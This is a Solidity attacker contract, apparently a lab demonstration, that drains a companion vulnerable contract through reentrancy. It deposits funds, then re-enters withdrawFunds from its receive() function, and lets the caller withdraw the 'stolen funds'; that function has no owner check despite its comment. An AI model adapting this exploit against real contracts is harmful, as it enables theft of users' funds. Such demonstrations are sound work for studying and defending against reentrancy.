// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./VulnerableContractReentrancy.sol";

contract AttackerContractReentrancy {
    VulnerableContractReentrancy public vulnerableContract;
    uint256 public constant WITHDRAW_AMOUNT = 1 ether;
    
    constructor(address _vulnerableContract) {
        vulnerableContract = VulnerableContractReentrancy(_vulnerableContract);
    }
    
    // Start the attack by depositing and withdrawing
    function attack() external payable {
        require(msg.value >= WITHDRAW_AMOUNT, "Need initial funds");
        
        // Initial deposit
        vulnerableContract.depositFunds{value: WITHDRAW_AMOUNT}();
        
        // Start withdrawal that will trigger reentrancy
        vulnerableContract.withdrawFunds(WITHDRAW_AMOUNT);
    }
    
    // Fallback function that gets triggered when receiving ETH
    receive() external payable {
        // Check if vulnerable contract still has balance
        if (address(vulnerableContract).balance >= WITHDRAW_AMOUNT) {
            vulnerableContract.withdrawFunds(WITHDRAW_AMOUNT);
        }
    }
    
    // Allow owner to withdraw stolen funds
    function withdrawStolenFunds() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}